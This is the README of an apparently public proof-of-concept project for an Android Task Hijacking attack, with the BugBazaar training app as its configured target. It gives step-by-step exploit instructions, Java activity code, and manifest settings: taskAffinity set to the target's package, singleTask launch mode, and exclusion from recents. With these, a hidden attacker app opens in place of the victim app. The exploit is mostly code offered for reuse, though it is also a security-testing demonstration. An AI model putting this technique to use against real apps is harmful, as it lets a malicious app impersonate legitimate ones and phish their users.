# Task Hijacking POC
This is a sample project which will help to exploit and create a POC for Task Hijacking Attack. This repository already have configured to exploit Task Hijacking vulnerability on BugBazaar application. Feel free to use this repo to create poc for your project.

### Steps to exploit Task Hijacking
1. Open Target application and make sure it is running properly. 
2. Decompile the apk of your target application and check "android:launchMode" value in AndroidManifest.xml file. If it's set to `singleTask` then application is exploitable.
3. Now create a new project in Android Studio or use this project.
4. In MainActivity.java, put following code:
```
    public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        moveTaskToBack(true);
    }

    @Override
    public void onResume(){
        super.onResume();
        setContentView(R.layout.activity_main);
    }
}
```
5. In AndroidManifest.xml file, put following line of code in <application> element. Make sure to replace package name with your target app package name.
  `android:taskAffinity="com.TargetApp.PackageName"`
	
6. Replace MainActivity declaration with following line of code:
	`<activity android:name=".MainActivity" android:launchMode="singleTask" android:excludeFromRecents="true" android:exported="true">`

7. Replace activity_main.xml layout content with following content:
```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:gravity="center"
    tools:context=".MainActivity">

    <TextView
        android:layout_width="350dp"
        android:layout_height="88dp"
        android:text="Attacker's Application"
        android:textSize="35dp"
        android:textStyle="bold"
        android:gravity="center"></TextView>

    <TextView
        android:layout_width="350dp"
        android:layout_height="88dp"
        android:text="Task Hijacking Demo"
        android:textSize="20sp"
        android:textStyle="bold"
        android:gravity="center"></TextView>

</LinearLayout>

```
8. Run this application inside the same device where Target App is installed.
9. Our app will open and close quickly. It will not also can be seen in recent apps.
10. Now open Target application and you will see instead, target application, our malicious app will be opened.
